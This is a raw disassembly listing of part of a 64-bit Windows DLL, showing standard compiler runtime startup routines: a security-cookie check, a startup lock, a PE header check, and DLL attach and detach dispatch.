   1800033aa:	cc                   	int3
   1800033ab:	cc                   	int3
   1800033ac:	cc                   	int3
   1800033ad:	cc                   	int3
   1800033ae:	cc                   	int3
   1800033af:	cc                   	int3
   1800033b0:	cc                   	int3
   1800033b1:	cc                   	int3
   1800033b2:	cc                   	int3
   1800033b3:	cc                   	int3
   1800033b4:	cc                   	int3
   1800033b5:	cc                   	int3
   1800033b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800033bd:	00 00 00 
   1800033c0:	48 3b 0d 79 3c 00 00 	cmp    0x3c79(%rip),%rcx        # 0x180007040
   1800033c7:	75 10                	jne    0x1800033d9
   1800033c9:	48 c1 c1 10          	rol    $0x10,%rcx
   1800033cd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   1800033d2:	75 01                	jne    0x1800033d5
   1800033d4:	c3                   	ret
   1800033d5:	48 c1 c9 10          	ror    $0x10,%rcx
   1800033d9:	e9 32 08 00 00       	jmp    0x180003c10
   1800033de:	cc                   	int3
   1800033df:	cc                   	int3
   1800033e0:	40 53                	rex push %rbx
   1800033e2:	48 83 ec 20          	sub    $0x20,%rsp
   1800033e6:	48 8b d9             	mov    %rcx,%rbx
   1800033e9:	eb 0f                	jmp    0x1800033fa
   1800033eb:	48 8b cb             	mov    %rbx,%rcx
   1800033ee:	e8 5d 0f 00 00       	call   0x180004350
   1800033f3:	85 c0                	test   %eax,%eax
   1800033f5:	74 13                	je     0x18000340a
   1800033f7:	48 8b cb             	mov    %rbx,%rcx
   1800033fa:	e8 4b 0f 00 00       	call   0x18000434a
   1800033ff:	48 85 c0             	test   %rax,%rax
   180003402:	74 e7                	je     0x1800033eb
   180003404:	48 83 c4 20          	add    $0x20,%rsp
   180003408:	5b                   	pop    %rbx
   180003409:	c3                   	ret
   18000340a:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   18000340e:	74 06                	je     0x180003416
   180003410:	e8 67 09 00 00       	call   0x180003d7c
   180003415:	cc                   	int3
   180003416:	e8 55 de ff ff       	call   0x180001270
   18000341b:	cc                   	int3
   18000341c:	48 8b c4             	mov    %rsp,%rax
   18000341f:	4c 89 48 20          	mov    %r9,0x20(%rax)
   180003423:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180003427:	48 89 50 10          	mov    %rdx,0x10(%rax)
   18000342b:	53                   	push   %rbx
   18000342c:	56                   	push   %rsi
   18000342d:	57                   	push   %rdi
   18000342e:	41 56                	push   %r14
   180003430:	48 83 ec 38          	sub    $0x38,%rsp
   180003434:	4d 8b f1             	mov    %r9,%r14
   180003437:	49 8b d8             	mov    %r8,%rbx
   18000343a:	48 8b f2             	mov    %rdx,%rsi
   18000343d:	c6 40 c8 00          	movb   $0x0,-0x38(%rax)
   180003441:	48 8b fa             	mov    %rdx,%rdi
   180003444:	49 0f af f8          	imul   %r8,%rdi
   180003448:	48 03 f9             	add    %rcx,%rdi
   18000344b:	48 89 78 08          	mov    %rdi,0x8(%rax)
   18000344f:	48 8b c3             	mov    %rbx,%rax
   180003452:	48 ff cb             	dec    %rbx
   180003455:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   18000345a:	48 85 c0             	test   %rax,%rax
   18000345d:	74 19                	je     0x180003478
   18000345f:	48 2b fe             	sub    %rsi,%rdi
   180003462:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   180003467:	48 8b cf             	mov    %rdi,%rcx
   18000346a:	49 8b c6             	mov    %r14,%rax
   18000346d:	48 8b 15 f4 1d 00 00 	mov    0x1df4(%rip),%rdx        # 0x180005268
   180003474:	ff d2                	call   *%rdx
   180003476:	eb d7                	jmp    0x18000344f
   180003478:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   18000347d:	48 83 c4 38          	add    $0x38,%rsp
   180003481:	41 5e                	pop    %r14
   180003483:	5f                   	pop    %rdi
   180003484:	5e                   	pop    %rsi
   180003485:	5b                   	pop    %rbx
   180003486:	c3                   	ret
   180003487:	cc                   	int3
   180003488:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   18000348d:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003492:	57                   	push   %rdi
   180003493:	41 56                	push   %r14
   180003495:	41 57                	push   %r15
   180003497:	48 83 ec 40          	sub    $0x40,%rsp
   18000349b:	4d 8b f1             	mov    %r9,%r14
   18000349e:	49 8b f0             	mov    %r8,%rsi
   1800034a1:	4c 8b fa             	mov    %rdx,%r15
   1800034a4:	48 8b f9             	mov    %rcx,%rdi
   1800034a7:	33 db                	xor    %ebx,%ebx
   1800034a9:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1800034ae:	48 3b de             	cmp    %rsi,%rbx
   1800034b1:	74 19                	je     0x1800034cc
   1800034b3:	49 2b ff             	sub    %r15,%rdi
   1800034b6:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   1800034bb:	48 8b cf             	mov    %rdi,%rcx
   1800034be:	49 8b c6             	mov    %r14,%rax
   1800034c1:	ff 15 a1 1d 00 00    	call   *0x1da1(%rip)        # 0x180005268
   1800034c7:	48 ff c3             	inc    %rbx
   1800034ca:	eb dd                	jmp    0x1800034a9
   1800034cc:	eb 00                	jmp    0x1800034ce
   1800034ce:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1800034d3:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1800034d8:	48 83 c4 40          	add    $0x40,%rsp
   1800034dc:	41 5f                	pop    %r15
   1800034de:	41 5e                	pop    %r14
   1800034e0:	5f                   	pop    %rdi
   1800034e1:	c3                   	ret
   1800034e2:	cc                   	int3
   1800034e3:	cc                   	int3
   1800034e4:	48 83 ec 28          	sub    $0x28,%rsp
   1800034e8:	e8 53 0b 00 00       	call   0x180004040
   1800034ed:	85 c0                	test   %eax,%eax
   1800034ef:	74 21                	je     0x180003512
   1800034f1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1800034f8:	00 00 
   1800034fa:	48 8b 48 08          	mov    0x8(%rax),%rcx
   1800034fe:	eb 05                	jmp    0x180003505
   180003500:	48 3b c8             	cmp    %rax,%rcx
   180003503:	74 14                	je     0x180003519
   180003505:	33 c0                	xor    %eax,%eax
   180003507:	f0 48 0f b1 0d 68 3c 	lock cmpxchg %rcx,0x3c68(%rip)        # 0x180007178
   18000350e:	00 00 
   180003510:	75 ee                	jne    0x180003500
   180003512:	32 c0                	xor    %al,%al
   180003514:	48 83 c4 28          	add    $0x28,%rsp
   180003518:	c3                   	ret
   180003519:	b0 01                	mov    $0x1,%al
   18000351b:	eb f7                	jmp    0x180003514
   18000351d:	cc                   	int3
   18000351e:	cc                   	int3
   18000351f:	cc                   	int3
   180003520:	48 83 ec 28          	sub    $0x28,%rsp
   180003524:	e8 17 0b 00 00       	call   0x180004040
   180003529:	85 c0                	test   %eax,%eax
   18000352b:	74 07                	je     0x180003534
   18000352d:	e8 6e 08 00 00       	call   0x180003da0
   180003532:	eb 19                	jmp    0x18000354d
   180003534:	e8 ff 0a 00 00       	call   0x180004038
   180003539:	8b c8                	mov    %eax,%ecx
   18000353b:	e8 22 0e 00 00       	call   0x180004362
   180003540:	85 c0                	test   %eax,%eax
   180003542:	74 04                	je     0x180003548
   180003544:	32 c0                	xor    %al,%al
   180003546:	eb 07                	jmp    0x18000354f
   180003548:	e8 1b 0e 00 00       	call   0x180004368
   18000354d:	b0 01                	mov    $0x1,%al
   18000354f:	48 83 c4 28          	add    $0x28,%rsp
   180003553:	c3                   	ret
   180003554:	48 83 ec 28          	sub    $0x28,%rsp
   180003558:	33 c9                	xor    %ecx,%ecx
   18000355a:	e8 2d 01 00 00       	call   0x18000368c
   18000355f:	84 c0                	test   %al,%al
   180003561:	0f 95 c0             	setne  %al
   180003564:	48 83 c4 28          	add    $0x28,%rsp
   180003568:	c3                   	ret
   180003569:	cc                   	int3
   18000356a:	cc                   	int3
   18000356b:	cc                   	int3
   18000356c:	48 83 ec 28          	sub    $0x28,%rsp
   180003570:	e8 2b 0e 00 00       	call   0x1800043a0
   180003575:	84 c0                	test   %al,%al
   180003577:	75 04                	jne    0x18000357d
   180003579:	32 c0                	xor    %al,%al
   18000357b:	eb 12                	jmp    0x18000358f
   18000357d:	e8 1e 0e 00 00       	call   0x1800043a0
   180003582:	84 c0                	test   %al,%al
   180003584:	75 07                	jne    0x18000358d
   180003586:	e8 15 0e 00 00       	call   0x1800043a0
   18000358b:	eb ec                	jmp    0x180003579
   18000358d:	b0 01                	mov    $0x1,%al
   18000358f:	48 83 c4 28          	add    $0x28,%rsp
   180003593:	c3                   	ret
   180003594:	48 83 ec 28          	sub    $0x28,%rsp
   180003598:	e8 03 0e 00 00       	call   0x1800043a0
   18000359d:	e8 fe 0d 00 00       	call   0x1800043a0
   1800035a2:	b0 01                	mov    $0x1,%al
   1800035a4:	48 83 c4 28          	add    $0x28,%rsp
   1800035a8:	c3                   	ret
   1800035a9:	cc                   	int3
   1800035aa:	cc                   	int3
   1800035ab:	cc                   	int3
   1800035ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800035b1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800035b6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800035bb:	57                   	push   %rdi
   1800035bc:	48 83 ec 20          	sub    $0x20,%rsp
   1800035c0:	49 8b f9             	mov    %r9,%rdi
   1800035c3:	49 8b f0             	mov    %r8,%rsi
   1800035c6:	8b da                	mov    %edx,%ebx
   1800035c8:	48 8b e9             	mov    %rcx,%rbp
   1800035cb:	e8 70 0a 00 00       	call   0x180004040
   1800035d0:	85 c0                	test   %eax,%eax
   1800035d2:	75 16                	jne    0x1800035ea
   1800035d4:	83 fb 01             	cmp    $0x1,%ebx
   1800035d7:	75 11                	jne    0x1800035ea
   1800035d9:	4c 8b c6             	mov    %rsi,%r8
   1800035dc:	33 d2                	xor    %edx,%edx
   1800035de:	48 8b cd             	mov    %rbp,%rcx
   1800035e1:	48 8b c7             	mov    %rdi,%rax
   1800035e4:	ff 15 7e 1c 00 00    	call   *0x1c7e(%rip)        # 0x180005268
   1800035ea:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   1800035ef:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   1800035f3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800035f8:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1800035fd:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180003602:	48 83 c4 20          	add    $0x20,%rsp
   180003606:	5f                   	pop    %rdi
   180003607:	e9 50 0d 00 00       	jmp    0x18000435c
   18000360c:	48 83 ec 28          	sub    $0x28,%rsp
   180003610:	e8 2b 0a 00 00       	call   0x180004040
   180003615:	85 c0                	test   %eax,%eax
   180003617:	74 10                	je     0x180003629
   180003619:	48 8d 0d 68 3b 00 00 	lea    0x3b68(%rip),%rcx        # 0x180007188
   180003620:	48 83 c4 28          	add    $0x28,%rsp
   180003624:	e9 51 0d 00 00       	jmp    0x18000437a
   180003629:	e8 76 0d 00 00       	call   0x1800043a4
   18000362e:	85 c0                	test   %eax,%eax
   180003630:	75 05                	jne    0x180003637
   180003632:	e8 4f 0d 00 00       	call   0x180004386
   180003637:	48 83 c4 28          	add    $0x28,%rsp
   18000363b:	c3                   	ret
   18000363c:	48 83 ec 28          	sub    $0x28,%rsp
   180003640:	33 c9                	xor    %ecx,%ecx
   180003642:	e8 59 0d 00 00       	call   0x1800043a0
   180003647:	48 83 c4 28          	add    $0x28,%rsp
   18000364b:	e9 50 0d 00 00       	jmp    0x1800043a0
   180003650:	48 83 ec 28          	sub    $0x28,%rsp
   180003654:	85 c9                	test   %ecx,%ecx
   180003656:	75 07                	jne    0x18000365f
   180003658:	c6 05 21 3b 00 00 01 	movb   $0x1,0x3b21(%rip)        # 0x180007180
   18000365f:	e8 3c 07 00 00       	call   0x180003da0
   180003664:	e8 37 0d 00 00       	call   0x1800043a0
   180003669:	84 c0                	test   %al,%al
   18000366b:	75 04                	jne    0x180003671
   18000366d:	32 c0                	xor    %al,%al
   18000366f:	eb 14                	jmp    0x180003685
   180003671:	e8 2a 0d 00 00       	call   0x1800043a0
   180003676:	84 c0                	test   %al,%al
   180003678:	75 09                	jne    0x180003683
   18000367a:	33 c9                	xor    %ecx,%ecx
   18000367c:	e8 1f 0d 00 00       	call   0x1800043a0
   180003681:	eb ea                	jmp    0x18000366d
   180003683:	b0 01                	mov    $0x1,%al
   180003685:	48 83 c4 28          	add    $0x28,%rsp
   180003689:	c3                   	ret
   18000368a:	cc                   	int3
   18000368b:	cc                   	int3
   18000368c:	40 53                	rex push %rbx
   18000368e:	48 83 ec 20          	sub    $0x20,%rsp
   180003692:	80 3d e8 3a 00 00 00 	cmpb   $0x0,0x3ae8(%rip)        # 0x180007181
   180003699:	8b d9                	mov    %ecx,%ebx
   18000369b:	75 67                	jne    0x180003704
   18000369d:	83 f9 01             	cmp    $0x1,%ecx
   1800036a0:	77 6a                	ja     0x18000370c
   1800036a2:	e8 99 09 00 00       	call   0x180004040
   1800036a7:	85 c0                	test   %eax,%eax
   1800036a9:	74 28                	je     0x1800036d3
   1800036ab:	85 db                	test   %ebx,%ebx
   1800036ad:	75 24                	jne    0x1800036d3
   1800036af:	48 8d 0d d2 3a 00 00 	lea    0x3ad2(%rip),%rcx        # 0x180007188
   1800036b6:	e8 b3 0c 00 00       	call   0x18000436e
   1800036bb:	85 c0                	test   %eax,%eax
   1800036bd:	75 10                	jne    0x1800036cf
   1800036bf:	48 8d 0d da 3a 00 00 	lea    0x3ada(%rip),%rcx        # 0x1800071a0
   1800036c6:	e8 a3 0c 00 00       	call   0x18000436e
   1800036cb:	85 c0                	test   %eax,%eax
   1800036cd:	74 2e                	je     0x1800036fd
   1800036cf:	32 c0                	xor    %al,%al
   1800036d1:	eb 33                	jmp    0x180003706
   1800036d3:	66 0f 6f 05 05 1c 00 	movdqa 0x1c05(%rip),%xmm0        # 0x1800052e0
   1800036da:	00 
   1800036db:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1800036df:	f3 0f 7f 05 a1 3a 00 	movdqu %xmm0,0x3aa1(%rip)        # 0x180007188
   1800036e6:	00 
   1800036e7:	48 89 05 aa 3a 00 00 	mov    %rax,0x3aaa(%rip)        # 0x180007198
   1800036ee:	f3 0f 7f 05 aa 3a 00 	movdqu %xmm0,0x3aaa(%rip)        # 0x1800071a0
   1800036f5:	00 
   1800036f6:	48 89 05 b3 3a 00 00 	mov    %rax,0x3ab3(%rip)        # 0x1800071b0
   1800036fd:	c6 05 7d 3a 00 00 01 	movb   $0x1,0x3a7d(%rip)        # 0x180007181
   180003704:	b0 01                	mov    $0x1,%al
   180003706:	48 83 c4 20          	add    $0x20,%rsp
   18000370a:	5b                   	pop    %rbx
   18000370b:	c3                   	ret
   18000370c:	b9 05 00 00 00       	mov    $0x5,%ecx
   180003711:	e8 42 09 00 00       	call   0x180004058
   180003716:	cc                   	int3
   180003717:	cc                   	int3
   180003718:	48 83 ec 18          	sub    $0x18,%rsp
   18000371c:	4c 8b c1             	mov    %rcx,%r8
   18000371f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180003724:	66 39 05 d5 c8 ff ff 	cmp    %ax,-0x372b(%rip)        # 0x180000000
   18000372b:	75 78                	jne    0x1800037a5
   18000372d:	48 63 0d 08 c9 ff ff 	movslq -0x36f8(%rip),%rcx        # 0x18000003c
   180003734:	48 8d 15 c5 c8 ff ff 	lea    -0x373b(%rip),%rdx        # 0x180000000
   18000373b:	48 03 ca             	add    %rdx,%rcx
   18000373e:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180003744:	75 5f                	jne    0x1800037a5
   180003746:	b8 0b 02 00 00       	mov    $0x20b,%eax
   18000374b:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   18000374f:	75 54                	jne    0x1800037a5
   180003751:	4c 2b c2             	sub    %rdx,%r8
   180003754:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   180003758:	48 83 c2 18          	add    $0x18,%rdx
   18000375c:	48 03 d1             	add    %rcx,%rdx
   18000375f:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   180003763:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180003767:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   18000376b:	48 89 14 24          	mov    %rdx,(%rsp)
   18000376f:	49 3b d1             	cmp    %r9,%rdx
   180003772:	74 18                	je     0x18000378c
   180003774:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180003777:	4c 3b c1             	cmp    %rcx,%r8
   18000377a:	72 0a                	jb     0x180003786
   18000377c:	8b 42 08             	mov    0x8(%rdx),%eax
   18000377f:	03 c1                	add    %ecx,%eax
   180003781:	4c 3b c0             	cmp    %rax,%r8
   180003784:	72 08                	jb     0x18000378e
   180003786:	48 83 c2 28          	add    $0x28,%rdx
   18000378a:	eb df                	jmp    0x18000376b
   18000378c:	33 d2                	xor    %edx,%edx
   18000378e:	48 85 d2             	test   %rdx,%rdx
   180003791:	75 04                	jne    0x180003797
   180003793:	32 c0                	xor    %al,%al
   180003795:	eb 14                	jmp    0x1800037ab
   180003797:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   18000379b:	7d 04                	jge    0x1800037a1
   18000379d:	32 c0                	xor    %al,%al
   18000379f:	eb 0a                	jmp    0x1800037ab
   1800037a1:	b0 01                	mov    $0x1,%al
   1800037a3:	eb 06                	jmp    0x1800037ab
   1800037a5:	32 c0                	xor    %al,%al
   1800037a7:	eb 02                	jmp    0x1800037ab
   1800037a9:	32 c0                	xor    %al,%al
   1800037ab:	48 83 c4 18          	add    $0x18,%rsp
   1800037af:	c3                   	ret
   1800037b0:	40 53                	rex push %rbx
   1800037b2:	48 83 ec 20          	sub    $0x20,%rsp
   1800037b6:	8a d9                	mov    %cl,%bl
   1800037b8:	e8 83 08 00 00       	call   0x180004040
   1800037bd:	33 d2                	xor    %edx,%edx
   1800037bf:	85 c0                	test   %eax,%eax
   1800037c1:	74 0b                	je     0x1800037ce
   1800037c3:	84 db                	test   %bl,%bl
   1800037c5:	75 07                	jne    0x1800037ce
   1800037c7:	48 87 15 aa 39 00 00 	xchg   %rdx,0x39aa(%rip)        # 0x180007178
   1800037ce:	48 83 c4 20          	add    $0x20,%rsp
   1800037d2:	5b                   	pop    %rbx
   1800037d3:	c3                   	ret
   1800037d4:	40 53                	rex push %rbx
   1800037d6:	48 83 ec 20          	sub    $0x20,%rsp
   1800037da:	80 3d 9f 39 00 00 00 	cmpb   $0x0,0x399f(%rip)        # 0x180007180
   1800037e1:	8a d9                	mov    %cl,%bl
   1800037e3:	74 04                	je     0x1800037e9
   1800037e5:	84 d2                	test   %dl,%dl
   1800037e7:	75 0c                	jne    0x1800037f5
   1800037e9:	e8 b2 0b 00 00       	call   0x1800043a0
   1800037ee:	8a cb                	mov    %bl,%cl
   1800037f0:	e8 ab 0b 00 00       	call   0x1800043a0
   1800037f5:	b0 01                	mov    $0x1,%al
   1800037f7:	48 83 c4 20          	add    $0x20,%rsp
   1800037fb:	5b                   	pop    %rbx
   1800037fc:	c3                   	ret
   1800037fd:	cc                   	int3
   1800037fe:	cc                   	int3
   1800037ff:	cc                   	int3
   180003800:	40 53                	rex push %rbx
   180003802:	48 83 ec 20          	sub    $0x20,%rsp
   180003806:	48 83 3d 7a 39 00 00 	cmpq   $0xffffffffffffffff,0x397a(%rip)        # 0x180007188
   18000380d:	ff 
   18000380e:	48 8b d9             	mov    %rcx,%rbx
   180003811:	75 07                	jne    0x18000381a
   180003813:	e8 68 0b 00 00       	call   0x180004380
   180003818:	eb 0f                	jmp    0x180003829
   18000381a:	48 8b d3             	mov    %rbx,%rdx
   18000381d:	48 8d 0d 64 39 00 00 	lea    0x3964(%rip),%rcx        # 0x180007188
   180003824:	e8 4b 0b 00 00       	call   0x180004374
   180003829:	33 d2                	xor    %edx,%edx
   18000382b:	85 c0                	test   %eax,%eax
   18000382d:	48 0f 44 d3          	cmove  %rbx,%rdx
   180003831:	48 8b c2             	mov    %rdx,%rax
   180003834:	48 83 c4 20          	add    $0x20,%rsp
   180003838:	5b                   	pop    %rbx
   180003839:	c3                   	ret
   18000383a:	cc                   	int3
   18000383b:	cc                   	int3
   18000383c:	48 83 ec 28          	sub    $0x28,%rsp
   180003840:	e8 bb ff ff ff       	call   0x180003800
   180003845:	48 f7 d8             	neg    %rax
   180003848:	1b c0                	sbb    %eax,%eax
   18000384a:	f7 d8                	neg    %eax
   18000384c:	ff c8                	dec    %eax
   18000384e:	48 83 c4 28          	add    $0x28,%rsp
   180003852:	c3                   	ret
   180003853:	cc                   	int3
   180003854:	e9 4b 09 00 00       	jmp    0x1800041a4
   180003859:	cc                   	int3
   18000385a:	cc                   	int3
   18000385b:	cc                   	int3
   18000385c:	40 53                	rex push %rbx
   18000385e:	48 83 ec 20          	sub    $0x20,%rsp
   180003862:	48 8d 05 8f 1a 00 00 	lea    0x1a8f(%rip),%rax        # 0x1800052f8
   180003869:	48 8b d9             	mov    %rcx,%rbx
   18000386c:	48 89 01             	mov    %rax,(%rcx)
   18000386f:	f6 c2 01             	test   $0x1,%dl
   180003872:	74 0a                	je     0x18000387e
   180003874:	ba 18 00 00 00       	mov    $0x18,%edx
   180003879:	e8 d6 ff ff ff       	call   0x180003854
   18000387e:	48 8b c3             	mov    %rbx,%rax
   180003881:	48 83 c4 20          	add    $0x20,%rsp
   180003885:	5b                   	pop    %rbx
   180003886:	c3                   	ret
   180003887:	cc                   	int3
   180003888:	48 83 ec 28          	sub    $0x28,%rsp
   18000388c:	85 d2                	test   %edx,%edx
   18000388e:	74 39                	je     0x1800038c9
   180003890:	83 ea 01             	sub    $0x1,%edx
   180003893:	74 28                	je     0x1800038bd
   180003895:	83 ea 01             	sub    $0x1,%edx
   180003898:	74 16                	je     0x1800038b0
   18000389a:	83 fa 01             	cmp    $0x1,%edx
   18000389d:	74 0a                	je     0x1800038a9
   18000389f:	b8 01 00 00 00       	mov    $0x1,%eax
   1800038a4:	48 83 c4 28          	add    $0x28,%rsp
   1800038a8:	c3                   	ret
   1800038a9:	e8 e6 fc ff ff       	call   0x180003594
   1800038ae:	eb 05                	jmp    0x1800038b5
   1800038b0:	e8 b7 fc ff ff       	call   0x18000356c
   1800038b5:	0f b6 c0             	movzbl %al,%eax
   1800038b8:	48 83 c4 28          	add    $0x28,%rsp
   1800038bc:	c3                   	ret
   1800038bd:	49 8b d0             	mov    %r8,%rdx
   1800038c0:	48 83 c4 28          	add    $0x28,%rsp
   1800038c4:	e9 0f 00 00 00       	jmp    0x1800038d8
   1800038c9:	4d 85 c0             	test   %r8,%r8
   1800038cc:	0f 95 c1             	setne  %cl
   1800038cf:	48 83 c4 28          	add    $0x28,%rsp
   1800038d3:	e9 18 01 00 00       	jmp    0x1800039f0
   1800038d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800038dd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800038e2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800038e7:	41 56                	push   %r14
   1800038e9:	48 83 ec 20          	sub    $0x20,%rsp
   1800038ed:	48 8b f2             	mov    %rdx,%rsi
   1800038f0:	4c 8b f1             	mov    %rcx,%r14
   1800038f3:	33 c9                	xor    %ecx,%ecx
   1800038f5:	e8 56 fd ff ff       	call   0x180003650
   1800038fa:	84 c0                	test   %al,%al
   1800038fc:	0f 84 c8 00 00 00    	je     0x1800039ca
   180003902:	e8 dd fb ff ff       	call   0x1800034e4
   180003907:	8a d8                	mov    %al,%bl
   180003909:	88 44 24 40          	mov    %al,0x40(%rsp)
   18000390d:	40 b7 01             	mov    $0x1,%dil
   180003910:	83 3d 59 38 00 00 00 	cmpl   $0x0,0x3859(%rip)        # 0x180007170
   180003917:	0f 85 c5 00 00 00    	jne    0x1800039e2
   18000391d:	c7 05 49 38 00 00 01 	movl   $0x1,0x3849(%rip)        # 0x180007170
   180003924:	00 00 00 
   180003927:	e8 28 fc ff ff       	call   0x180003554
   18000392c:	84 c0                	test   %al,%al
   18000392e:	74 4f                	je     0x18000397f
   180003930:	e8 6f 09 00 00       	call   0x1800042a4
   180003935:	e8 22 09 00 00       	call   0x18000425c
   18000393a:	e8 41 09 00 00       	call   0x180004280
   18000393f:	48 8d 15 6a 19 00 00 	lea    0x196a(%rip),%rdx        # 0x1800052b0
   180003946:	48 8d 0d 5b 19 00 00 	lea    0x195b(%rip),%rcx        # 0x1800052a8
   18000394d:	e8 40 0a 00 00       	call   0x180004392
   180003952:	85 c0                	test   %eax,%eax
   180003954:	75 29                	jne    0x18000397f
   180003956:	e8 c5 fb ff ff       	call   0x180003520
   18000395b:	84 c0                	test   %al,%al
   18000395d:	74 20                	je     0x18000397f
   18000395f:	48 8d 15 3a 19 00 00 	lea    0x193a(%rip),%rdx        # 0x1800052a0
   180003966:	48 8d 0d 23 19 00 00 	lea    0x1923(%rip),%rcx        # 0x180005290
   18000396d:	e8 1a 0a 00 00       	call   0x18000438c
   180003972:	c7 05 f4 37 00 00 02 	movl   $0x2,0x37f4(%rip)        # 0x180007170
   180003979:	00 00 00 
   18000397c:	40 32 ff             	xor    %dil,%dil
   18000397f:	8a cb                	mov    %bl,%cl
   180003981:	e8 2a fe ff ff       	call   0x1800037b0
   180003986:	40 84 ff             	test   %dil,%dil
   180003989:	75 3f                	jne    0x1800039ca
   18000398b:	e8 0c 09 00 00       	call   0x18000429c
   180003990:	48 8b d8             	mov    %rax,%rbx
   180003993:	48 83 38 00          	cmpq   $0x0,(%rax)
   180003997:	74 24                	je     0x1800039bd
   180003999:	48 8b c8             	mov    %rax,%rcx
   18000399c:	e8 77 fd ff ff       	call   0x180003718
   1800039a1:	84 c0                	test   %al,%al
   1800039a3:	74 18                	je     0x1800039bd
   1800039a5:	4c 8b c6             	mov    %rsi,%r8
   1800039a8:	ba 02 00 00 00       	mov    $0x2,%edx
   1800039ad:	49 8b ce             	mov    %r14,%rcx
   1800039b0:	48 8b 03             	mov    (%rbx),%rax
   1800039b3:	4c 8b 0d ae 18 00 00 	mov    0x18ae(%rip),%r9        # 0x180005268
   1800039ba:	41 ff d1             	call   *%r9
   1800039bd:	ff 05 f5 37 00 00    	incl   0x37f5(%rip)        # 0x1800071b8
   1800039c3:	b8 01 00 00 00       	mov    $0x1,%eax
   1800039c8:	eb 02                	jmp    0x1800039cc
   1800039ca:	33 c0                	xor    %eax,%eax
   1800039cc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800039d1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800039d6:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800039db:	48 83 c4 20          	add    $0x20,%rsp
   1800039df:	41 5e                	pop    %r14
   1800039e1:	c3                   	ret
   1800039e2:	b9 07 00 00 00       	mov    $0x7,%ecx
   1800039e7:	e8 6c 06 00 00       	call   0x180004058
   1800039ec:	90                   	nop
   1800039ed:	cc                   	int3
   1800039ee:	cc                   	int3
   1800039ef:	cc                   	int3
   1800039f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800039f5:	57                   	push   %rdi
   1800039f6:	48 83 ec 30          	sub    $0x30,%rsp
   1800039fa:	40 8a f9             	mov    %cl,%dil
   1800039fd:	8b 05 b5 37 00 00    	mov    0x37b5(%rip),%eax        # 0x1800071b8
   180003a03:	85 c0                	test   %eax,%eax
   180003a05:	7f 0d                	jg     0x180003a14
   180003a07:	33 c0                	xor    %eax,%eax
   180003a09:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003a0e:	48 83 c4 30          	add    $0x30,%rsp
   180003a12:	5f                   	pop    %rdi
   180003a13:	c3                   	ret
   180003a14:	ff c8                	dec    %eax
   180003a16:	89 05 9c 37 00 00    	mov    %eax,0x379c(%rip)        # 0x1800071b8
   180003a1c:	e8 c3 fa ff ff       	call   0x1800034e4
   180003a21:	8a d8                	mov    %al,%bl
   180003a23:	88 44 24 20          	mov    %al,0x20(%rsp)
   180003a27:	83 3d 42 37 00 00 02 	cmpl   $0x2,0x3742(%rip)        # 0x180007170
   180003a2e:	75 36                	jne    0x180003a66
   180003a30:	e8 d7 fb ff ff       	call   0x18000360c
   180003a35:	e8 32 08 00 00       	call   0x18000426c
   180003a3a:	e8 a1 08 00 00       	call   0x1800042e0
   180003a3f:	c7 05 27 37 00 00 00 	movl   $0x0,0x3727(%rip)        # 0x180007170
   180003a46:	00 00 00 
   180003a49:	8a cb                	mov    %bl,%cl
   180003a4b:	e8 60 fd ff ff       	call   0x1800037b0
   180003a50:	33 d2                	xor    %edx,%edx
   180003a52:	40 8a cf             	mov    %dil,%cl
   180003a55:	e8 7a fd ff ff       	call   0x1800037d4
   180003a5a:	0f b6 d8             	movzbl %al,%ebx
   180003a5d:	e8 da fb ff ff       	call   0x18000363c
   180003a62:	8b c3                	mov    %ebx,%eax
   180003a64:	eb a3                	jmp    0x180003a09
   180003a66:	b9 07 00 00 00       	mov    $0x7,%ecx
   180003a6b:	e8 e8 05 00 00       	call   0x180004058
   180003a70:	90                   	nop
   180003a71:	90                   	nop
   180003a72:	cc                   	int3
   180003a73:	cc                   	int3
   180003a74:	48 8b c4             	mov    %rsp,%rax
   180003a77:	48 89 58 20          	mov    %rbx,0x20(%rax)
   180003a7b:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180003a7f:	89 50 10             	mov    %edx,0x10(%rax)
   180003a82:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180003a86:	56                   	push   %rsi
   180003a87:	57                   	push   %rdi
   180003a88:	41 56                	push   %r14
